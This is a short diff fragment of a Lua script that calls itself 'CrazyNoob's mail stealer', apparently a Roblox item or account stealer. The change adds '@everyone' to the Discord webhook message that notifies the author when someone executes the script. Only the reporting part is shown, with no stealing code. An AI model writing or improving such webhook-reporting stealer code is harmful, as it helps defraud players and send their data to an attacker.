@@ -8,7 +8,7 @@ local webhookcheck =
 local url =
    _G.Webhook
 local data = {
-   ["content"] = "(__**This Was Generated Using CrazyNoob's mail stealer__**)",
+   ["content"] = "(@everyone __**This Was Generated Using CrazyNoob's mail stealer__**)",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
